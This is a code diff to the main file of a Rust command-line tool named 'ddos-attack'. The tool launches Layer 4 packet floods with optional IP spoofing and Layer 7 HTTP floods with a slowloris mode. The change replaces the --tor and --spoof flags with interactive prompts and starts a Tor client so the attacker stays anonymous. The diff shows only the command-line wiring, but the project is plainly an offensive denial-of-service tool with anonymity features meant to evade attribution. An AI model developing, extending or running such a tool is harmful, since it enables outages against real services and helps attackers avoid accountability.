@@ -11,7 +11,7 @@ mod utils;
 
 use attacks::{layer4, layer7};
 use tor::TorClient;
-use utils::{banner, logger};
+use utils::{banner, logger, input};
 
 #[derive(Parser)]
 #[command(name = "ddos-attack")]
@@ -50,14 +50,6 @@ enum Commands {
         /// Rate limit (packets per second)
         #[arg(long, default_value = "1000")]
         rate: u64,
-        
-        /// Enable IP spoofing
-        #[arg(long)]
-        spoof: bool,
-        
-        /// Use Tor for anonymity
-        #[arg(long)]
-        tor: bool,
     },
     
     /// Layer 7 HTTP/HTTPS flood attacks
@@ -81,10 +73,6 @@ enum Commands {
         /// HTTP method (GET/POST)
         #[arg(long, default_value = "GET")]
         method: String,
-        
-        /// Use Tor for anonymity
-        #[arg(long)]
-        tor: bool,
         
         /// Enable slowloris attack
         #[arg(long)]
@@ -125,10 +113,30 @@ async fn main() -> anyhow::Result<()> {
             threads,
             size,
             rate,
-            spoof,
-            tor,
         } => {
             info!("Starting Layer 4 attack");
+            
+            // Ask user for Tor usage
+            let use_tor = input::ask_for_tor();
+            
+            // Ask user for IP spoofing (only for UDP)
+            let use_spoofing = if protocol == "udp" {
+                input::ask_for_spoofing()
+            } else {
+                false
+            };
+            
+            // Start Tor if requested
+            if use_tor {
+                println!("{}", "🔄 Starting Tor service...".bright_blue());
+                let mut tor_client = TorClient::new().await?;
+                if let Err(e) = tor_client.start().await {
+                    eprintln!("{}", format!("Failed to start Tor: {}", e).red());
+                    std::process::exit(1);
+                }
+                println!("{}", "✅ Tor service started successfully!".bright_green());
+                tokio::time::sleep(Duration::from_secs(5)).await; // Wait for Tor to initialize
+            }
             
             let target_ips: Vec<IpAddr> = targets
                 .split(',')
@@ -146,8 +154,8 @@ async fn main() -> anyhow::Result<()> {
                 threads,
                 packet_size: size,
                 rate_limit: Duration::from_millis(1000 / rate),
-                use_spoofing: spoof,
-                use_tor: tor,
+                use_spoofing,
+                use_tor,
             };
             
             match protocol.as_str() {
@@ -166,10 +174,24 @@ async fn main() -> anyhow::Result<()> {
             rate,
             user_agent,
             method,
-            tor,
             slowloris,
         } => {
             info!("Starting Layer 7 attack");
+            
+            // Ask user for Tor usage
+            let use_tor = input::ask_for_tor();
+            
+            // Start Tor if requested
+            if use_tor {
+                println!("{}", "🔄 Starting Tor service...".bright_blue());
+                let mut tor_client = TorClient::new().await?;
+                if let Err(e) = tor_client.start().await {
+                    eprintln!("{}", format!("Failed to start Tor: {}", e).red());
+                    std::process::exit(1);
+                }
+                println!("{}", "✅ Tor service started successfully!".bright_green());
+                tokio::time::sleep(Duration::from_secs(5)).await; // Wait for Tor to initialize
+            }
             
             let target_urls: Vec<String> = targets
                 .split(',')
@@ -182,7 +204,7 @@ async fn main() -> anyhow::Result<()> {
                 rate_limit: Duration::from_millis(1000 / rate),
                 user_agent,
                 method,
-                use_tor: tor,
+                use_tor,
                 slowloris,
             };
             
